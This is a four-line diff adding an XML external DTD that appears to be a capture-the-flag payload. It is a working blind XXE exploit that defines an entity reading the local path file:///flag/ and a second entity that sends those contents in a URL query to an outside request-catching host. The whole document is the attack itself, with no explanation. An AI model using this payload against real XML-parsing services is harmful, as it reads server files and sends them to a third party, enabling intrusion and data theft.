@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///flag/">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://test12345.requestcatcher.com/?x=%file;'>">
+%eval;
+%exfiltrate;
